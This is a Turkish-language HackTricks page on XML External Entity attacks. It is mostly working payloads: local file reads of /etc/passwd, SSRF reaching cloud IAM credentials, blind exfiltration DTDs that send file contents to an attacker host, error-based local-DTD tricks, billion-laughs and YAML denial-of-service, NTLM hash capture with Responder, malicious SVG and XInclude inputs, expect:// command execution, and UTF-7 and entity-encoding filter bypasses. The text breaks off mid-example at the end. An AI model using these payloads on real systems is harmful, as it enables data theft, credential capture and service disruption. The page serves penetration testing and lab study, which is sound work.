# XXE - XEE - XML Harici Varlık

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## XML Temelleri

XML, veri depolama ve taşıma için tasarlanmış bir işaretleme dilidir ve açıkça adlandırılmış etiketlerin kullanımına olanak tanıyan esnek bir yapıya sahiptir. HTML'den, önceden tanımlanmış etiket kümesine sınırlı olmamasıyla farklılık gösterir. JSON'ın yükselişiyle XML'in önemi azalmış olmasına rağmen, başlangıçtaki rolü AJAX teknolojisindeydi.

* **Varlıklar Aracılığıyla Veri Temsili**: XML'deki varlıklar, `&lt;` ve `&gt;` gibi özel karakterler de dahil olmak üzere verinin temsil edilmesini sağlar; bu karakterler, `<` ve `>` ile çakışmayı önlemek için kullanılır.
* **XML Elemanlarının Tanımlanması**: XML, eleman türlerinin tanımlanmasına izin verir, elemanların nasıl yapılandırılması gerektiğini ve hangi içeriğe sahip olabileceğini belirler, her türlü içerikten belirli alt elemanlara kadar uzanabilir.
* **Belge Türü Tanımı (DTD)**: DTD'ler, belgenin yapısını ve içerebileceği veri türlerini tanımlamak için XML'de önemlidir. İç, dış veya bir kombinasyon olabilirler, belgelerin nasıl biçimlendirildiğini ve doğrulandığını yönlendirirler.
* **Özel ve Harici Varlıklar**: XML, esnek veri temsili için DTD içinde özel varlıkların oluşturulmasını destekler. URL ile tanımlanan harici varlıklar, özellikle XML Harici Varlık (XXE) saldırıları bağlamında güvenlik endişeleri doğurur; bu saldırılar, XML ayrıştırıcılarının harici veri kaynaklarını nasıl işlediğini sömürür: `<!DOCTYPE foo [ <!ENTITY myentity "değer" > ]>`
* **Parametre Varlıklarıyla XXE Tespiti**: Geleneksel yöntemlerin ayrıştırıcı güvenlik önlemleri nedeniyle başarısız olduğu durumlarda, XXE zafiyetlerini tespit etmek için özellikle XML parametre varlıkları kullanılabilir. Bu varlıklar, DNS sorgularını tetikleyerek veya kontrol edilen bir alan adına HTTP istekleri göndererek dış hattan tespit tekniklerine izin verir ve zafiyeti doğrular.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Ana saldırılar

[**Bu saldırıların çoğu harika Portswiggers XEE lablarında test edildi: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Yeni Varlık testi

Bu saldırıda, basit bir yeni VARLIK bildiriminin çalışıp çalışmadığını test edeceğim.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### Dosya okuma

Farklı yollarla `/etc/passwd` dosyasını okumayı deneyelim. Windows için şunu okumayı deneyebilirsiniz: `C:\windows\system32\drivers\etc\hosts`

Bu ilk durumda, SYSTEM "_\*\*file:///\*\*etc/passwd_"'nin de çalışacağını fark edin.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
Bu ikinci durum, web sunucusunun PHP kullanıyorsa bir dosya çıkarmak için faydalı olabilir (Portswiggers lab'ın durumu değil)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Bu üçüncü durumda, `Element stockCheck`'i ANY olarak bildirdiğimize dikkat edin.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
### Dizin listesi

Java tabanlı uygulamalarda, bir dosyanın içeriğini listelemek mümkün olabilir. XXE ile şu şekilde bir payload kullanarak (dosya yerine sadece dizini isteyerek):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Bir XXE, bir bulutta içeride bir SSRF'yi kötüye kullanmak için kullanılabilir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Kör SSRF

**Önceki yorumlanmış teknik** kullanılarak sunucunun, zayıf noktalarını göstermek için kontrol ettiğiniz bir sunucuya erişmesini sağlayabilirsiniz. Ancak, bu çalışmıyorsa, belki de **XML varlıklarına izin verilmiyordur**, bu durumda **XML parametre varlıklarını** deneyebilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Kör" SSRF - Verileri dışarıya çıkar

**Bu durumda, sunucuyu, bir dosyanın içeriğini HTTP isteği aracılığıyla gönderecek kötü amaçlı bir yük taşıyan yeni bir DTD yüklemeye zorlayacağız (**çok satırlı dosyalar için bunu** _**ftp://**_ **aracılığıyla dışarıya çıkarabilirsiniz** _**ftp://**_ **örneğin bu temel sunucuyu kullanarak [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Bu açıklama, [**Portswiggers lab burada**](https://portswigger.net/web-security/xxe/blind)** temellendirilmiştir.**

Verileri dışarıya çıkarmak için kötü amaçlı DTD'de bir dizi adım gerçekleştirilir:

### Kötü Amaçlı DTD Örneği:

Yapı aşağıdaki gibidir:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Bu DTD tarafından yürütülen adımlar şunlardır:

1. **Parametre Varlıklarının Tanımlanması:**
* Bir XML parametre varlığı, `%file`, `/etc/hostname` dosyasının içeriğini okuyarak oluşturulur.
* Başka bir XML parametre varlığı, `%eval`, tanımlanır. Dinamik olarak yeni bir XML parametre varlığı, `%exfiltrate`, bildirir. `%exfiltrate` varlığı, URL'nin sorgu dizgisinde `%file` varlığının içeriğini ileterek saldırganın sunucusuna HTTP isteği yapacak şekilde ayarlanır.
2. **Varlıkların Yürütülmesi:**
* `%eval` varlığı kullanılır ve `%exfiltrate` varlığının dinamik bildiriminin yürütülmesine yol açar.
* Ardından `%exfiltrate` varlığı kullanılır ve dosyanın içeriğini belirtilen URL'ye HTTP isteği yapar.

Saldırgan, bu kötü amaçlı DTD'yi genellikle `http://web-saldirgan.com/kotu.dtd` gibi bir URL'de kendi kontrolündeki bir sunucuda barındırır.

**XXE Yükü:** Zayıf bir uygulamayı sömürmek için saldırgan bir XXE yükü gönderir:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Bu payload, bir XML parametre varlığı `%xxe` tanımlar ve bunu DTD içine dahil eder. Bir XML ayrıştırıcı tarafından işlendiğinde, bu payload, saldırganın sunucusundan harici DTD'yi getirir. DTD daha sonra içeride yorumlanır, kötü amaçlı DTD'de belirtilen adımları yürütür ve `/etc/hostname` dosyasının saldırganın sunucusuna sızdırılmasına yol açar.

### Hata Tabanlı (Harici DTD)

**Bu durumda, sunucunun, bir dosyanın içeriğini bir hata mesajında gösterecek kötü amaçlı bir DTD yüklemesini sağlayacağız (bu yalnızca hata mesajlarını görebiliyorsanız geçerlidir).** [**Buradan örnek.**](https://portswigger.net/web-security/xxe/blind)

Bir XML ayrıştırma hatası mesajı, kötü amaçlı harici Document Type Definition (DTD) kullanılarak tetiklenebilir ve `/etc/passwd` dosyasının içeriğini ortaya çıkarabilir. Bu, aşağıdaki adımlar aracılığıyla gerçekleştirilir:

1. `/etc/passwd` dosyasının içeriğini içeren `file` adlı bir XML parametre varlığı tanımlanır.
2. `eval` adlı bir XML parametre varlığı tanımlanır ve `error` adlı başka bir XML parametre varlığı için dinamik bir bildirim içerir. Bu `error` varlığı değerlendirildiğinde, mevcut olmayan bir dosya yüklemeye çalışır ve içeriği `file` varlığını adı olarak içerir.
3. `eval` varlığı çağrılır ve `error` varlığının dinamik olarak bildirilmesine yol açar.
4. `error` varlığının çağrılması, mevcut olmayan bir dosya yüklemeye çalışır ve `/etc/passwd` dosyasının içeriğini dosya adının bir parçası olarak içeren bir hata mesajı üretir.

Kötü amaçlı harici DTD, aşağıdaki XML ile çağrılabilir:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### **Hata Tabanlı (sistem DTD)**

Peki, **dış bağlantılar engellendiğinde** kör XXE zafiyetleri ne olacak?.

XML dilindeki bir açıklık, bir belgenin DTD'sinin iç ve dış deklarasyonları karıştırdığında **hassas verilerin hata mesajları aracılığıyla ortaya çıkmasına** neden olabilir. Bu sorun, dışarıdan ve içeriden tanımlanan varlıkların içeriğinin tekrar tanımlanmasına izin verir ve hata tabanlı XXE saldırılarının gerçekleştirilmesini kolaylaştırır. Bu tür saldırılar, bir XML parametre varlığının, başlangıçta dış bir DTD'de tanımlanan, iç bir DTD içinden tekrar tanımlanmasını sömürür. Sunucu tarafından dış bağlantılar engellendiğinde, saldırganlar saldırıyı gerçekleştirmek için yerel DTD dosyalarına güvenmek zorundadır ve hassas bilgileri ortaya çıkarmak için ayrıştırma hatası oluşturmayı amaçlarlar.

Sunucunun dosya sisteminde `/usr/local/app/schema.dtd` konumunda bir DTD dosyası bulunduğunu varsayalım ve bu dosya `custom_entity` adında bir varlık tanımlıyor. Bir saldırgan, aşağıdaki gibi bir karma DTD göndererek `/etc/passwd` dosyasının içeriğini ortaya çıkaran bir XML ayrıştırma hatası oluşturabilir:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
```markdown
Belirtilen adımlar bu DTD tarafından yürütülür:

* Sunucunun dosya sisteminde bulunan harici DTD dosyasını içeren `local_dtd` adında bir XML parametre varlığının tanımı yapılır.
* Harici DTD'de orijinal olarak tanımlanan `custom_entity` XML parametre varlığı için bir yeniden tanımlama gerçekleşir ve [hata tabanlı XXE saldırısını](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) kapsaması amaçlanır. Bu yeniden tanımlama, `/etc/passwd` dosyasının içeriğini ortaya çıkarmak için bir ayrıştırma hatası oluşturacak şekilde tasarlanmıştır.
* `local_dtd` varlığını kullanarak, harici DTD etkinleştirilir ve yeni tanımlanan `custom_entity` kapsanır. Bu eylem dizisi, saldırı tarafından hedeflenen hata mesajının yayınlanmasına neden olur.

**Gerçek dünya örneği:** GNOME masaüstü ortamını kullanan sistemler genellikle `ISOamso` adında bir varlık içeren `/usr/share/yelp/dtd/docbookx.dtd` konumunda bir DTD'ye sahiptir.
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Bu teknik bir **iç DTD kullandığından önce geçerli bir tane bulmanız gerekmektedir**. Bunun için aynı **işletim sistemi / Yazılımı yükleyerek** sunucunun kullandığı ve **varsayılan DTD'leri arayabilirsiniz**, veya sistemler içindeki **varsayılan DTD'lerin bir listesini alabilir** ve var olup olmadığını **kontrol edebilirsiniz**:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Daha fazla bilgi için [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Sistem içindeki DTD'leri Bulma

Aşağıdaki harika github deposunda **sistemde bulunabilecek DTD'lerin yollarını** bulabilirsiniz:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Ayrıca, **kurban sistemin Docker görüntüsüne** sahipseniz, aynı depodaki aracı kullanarak **görüntüyü tarama** ve sistem içinde bulunan **DTD'lerin yolunu bulma** imkanınız vardır. Nasıl yapılacağını öğrenmek için [githubın Readme'sini](https://github.com/GoSecure/dtd-finder) okuyun.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### Ofis Açık XML Ayrıştırıcıları Aracılığıyla XXE

Bu saldırının daha detaylı bir açıklaması için, [bu harika yazının ikinci bölümüne](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **Detectify**'dan bakabilirsiniz.

**Birçok web uygulaması tarafından Microsoft Office belgelerinin yüklenmesi** imkanı sunulur, ardından bu belgelerden belirli detaylar çıkarılır. Örneğin, bir web uygulaması kullanıcıların XLSX formatında bir elektronik tablo yükleyerek veri aktarmasına izin verebilir. Ayrıştırıcının elektronik tablodan verileri çıkarması için en az bir XML dosyasını ayrıştırması gerekecektir.

Bu zafiyetin test edilmesi için, **XXE yüklemesi içeren bir Microsoft Office dosyası oluşturmak** gereklidir. İlk adım, belgenin açılacağı boş bir dizin oluşturmaktır.

Belge açıldıktan sonra, `./unzipped/word/document.xml` konumundaki XML dosyası tercih edilen bir metin düzenleyicide (örneğin vim) açılıp düzenlenmelidir. XML, genellikle bir HTTP isteği ile başlayan istenilen XXE yüklemesini içerecek şekilde değiştirilmelidir.

Değiştirilmiş XML satırları iki kök XML nesnesi arasına yerleştirilmelidir. İstekler için izlenebilir bir URL ile URL'nin değiştirilmesi önemlidir.

Son olarak, kötü niyetli poc.docx dosyasını oluşturmak için dosya sıkıştırılabilir. Önceden oluşturulan "unzipped" dizininden, aşağıdaki komut çalıştırılmalıdır:

Şimdi, oluşturulan dosya potansiyel olarak savunmasız web uygulamasına yüklenebilir ve bir isteğin Burp Collaborator günlüklerinde görünmesi umulabilir.

### Jar: Protokolü

**jar** protokolü yalnızca **Java uygulamaları** içinde erişilebilir hale getirilmiştir. Bu, hem yerel hem de uzak dosyalara erişimi sağlamak üzere tasarlanmıştır ve bir **PKZIP** arşivinde (örneğin `.zip`, `.jar`, vb.) dosya erişimini sağlar.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
PKZIP dosyaları içindeki dosyalara erişebilmek, sistem DTD dosyaları aracılığıyla XXE'yi kötüye kullanmak için **son derece faydalıdır.** [Bu bölümü kontrol edin ve sistem DTD dosyalarını kötüye nasıl kullanacağınızı öğrenin](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

PKZIP arşivi içindeki bir dosyaya jar protokolü aracılığıyla erişme süreci birkaç adım içerir:

1. Belirtilen konumdan, örneğin `https://download.website.com/archive.zip` adresinden zip arşivini indirmek için bir HTTP isteği yapılır.
2. Arşivi içeren HTTP yanıtı genellikle `/tmp/...` gibi bir konumda geçici olarak sistemde saklanır.
3. Arşiv, içeriğine erişmek için çıkarılır.
4. Arşiv içindeki belirli dosya, `file.zip`, okunur.
5. Bu işlem sırasında oluşturulan geçici dosyaların silinmesinden sonra işlem tamamlanır.

Bu süreci ikinci adımda kesintiye uğratmanın ilginç bir tekniği, arşiv dosyasını sunarken sunucu bağlantısını sürekli açık tutmaktır. Bu amaçla kullanılabilecek araçlar [bu depoda](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) bulunmaktadır; bunlar arasında bir Python sunucusu (`slow_http_server.py`) ve bir Java sunucusu (`slowserver.jar`) bulunmaktadır.
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Geçici bir dizine dosya yazmak, yerel dosya dahil etme, şablon enjeksiyonu, XSLT RCE, serileştirme gibi başka bir güvenlik açığını artırmanıza yardımcı olabilir.
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Milyar Güldürme Saldırısı
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml Saldırısı
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Kare Kök Saldırısı

![](<../.gitbook/assets/image (524).png>)

#### NTML Almak

Windows ana bilgisayarlarında, bir responder.py işleyici ayarlayarak web sunucusu kullanıcısının NTML özetini almak mümkündür:
```bash
Responder.py -I eth0 -v
```
ve aşağıdaki isteği göndererek
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Gizli XXE Yüzeyleri

### XInclude

Müşteri verilerini sunucu tarafındaki XML belgelerine entegre ederken, özellikle arka uç SOAP isteklerinde, XML yapısını doğrudan değiştirme yeteneği genellikle sınırlıdır, bu da `DOCTYPE` öğesini değiştirmeye yönelik klasik XXE saldırılarını engeller. Bununla birlikte, bir `XInclude` saldırısı, XML belgesinin herhangi bir veri öğesine harici varlıkların eklenmesine izin vererek bir çözüm sunar. Bu yöntem, sunucu tarafından oluşturulan XML belgesindeki verilerin yalnızca bir kısmı kontrol edilebildiğinde bile etkilidir.

Bir `XInclude` saldırısını gerçekleştirmek için, `XInclude` ad alanının bildirilmesi ve amaçlanan harici varlığın dosya yolu belirtilmelidir. Aşağıda, böyle bir saldırının nasıl formüle edilebileceğine dair özlü bir örnek bulunmaktadır:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Daha fazla bilgi için [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) adresini kontrol edin!

### SVG - Dosya Yükleme

Kullanıcılar tarafından belirli uygulamalara yüklenen dosyalar, daha sonra sunucuda işlenirken XML veya XML içeren dosya biçimlerinin nasıl işlendiğindeki güvenlik açıklarını sömürebilir. Ofis belgeleri (DOCX) ve resimler (SVG) gibi yaygın dosya biçimleri XML'e dayanmaktadır.

Kullanıcılar **resim yüklediğinde**, bu resimler sunucu tarafından işlenir veya doğrulanır. PNG veya JPEG gibi biçimler bekleyen uygulamalar için bile, **sunucunun resim işleme kütüphanesi SVG resimleri de destekleyebilir**. XML tabanlı bir biçim olan SVG, saldırganların kötü niyetli SVG resimleri göndererek sunucuyu XXE (XML Dış Varlık) güvenlik açıklarına maruz bırakmasına neden olabilir.

Bu tür bir saldırının bir örneği aşağıda gösterilmektedir, kötü niyetli bir SVG resminin sistem dosyalarını okumaya çalıştığı:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Başka bir yöntem, PHP "expect" sarmalayıcısı aracılığıyla **komutları yürütmeye çalışmaktır**:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
Her iki durumda da SVG formatı, sunucunun yazılımının XML işleme yeteneklerini sömüren saldırıları başlatmak için kullanılır, sağlam giriş doğrulama ve güvenlik önlemlerinin gerekliliğini vurgular.

Daha fazla bilgi için [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)'i kontrol edin!

**Dosya yükleme - PDF**

Bir PDF dosyası yükleyerek XXE'yi nasıl sömürüleceğini öğrenmek için aşağıdaki yazıyı okuyun:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: x-www-urlencoded'dan XML'e

Bir POST isteği XML formatında veri kabul ediyorsa, bu istekte bir XXE'yi sömürmeyi deneyebilirsiniz. Örneğin, normal bir istek aşağıdakileri içeriyorsa:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Sonra aşağıdaki isteği gönderebilirsiniz, aynı sonuçla:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: JSON'dan XEE'ye

İsteği değiştirmek için "Content Type Converter" adlı bir Burp Eklentisini kullanabilirsiniz. Bu örneği [buradan](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) bulabilirsiniz:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Başka bir örnek [burada](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2) bulunabilir.

## WAF & Koruma Atlatmaları

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Bu sadece XML sunucusunun `data://` protokolünü kabul ettiği durumlarda çalışır.

### UTF-7

UTF-7'yi kullanabilirsiniz. \[**"Encode Recipe**" of cyberchef burada ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) UTF-7'ye dönüştürün.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Dosya:/ Protokolü Atlatma

Eğer web PHP kullanıyorsa, `file:/` yerine **php sarmalayıcıları** `php://filter/convert.base64-encode/resource=` kullanarak **dahili dosyalara erişebilirsiniz**.

Eğer web Java kullanıyorsa [**jar: protokolünü**](xxe-xee-xml-external-entity.md#jar-protocol) kontrol edebilirsiniz.

### HTML Varlıkları

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes) adresinden bir hile\
Bir **varlık içinde varlık** oluşturabilir ve onu **html varlıkları** ile kodlayarak **bir dtd yüklemek** için çağırabilirsiniz.\
Kullanılan **HTML Varlıklarının** **sayısal** olması gerektiğini unutmayın (örneğin \[bu örnekte]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD örneği:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
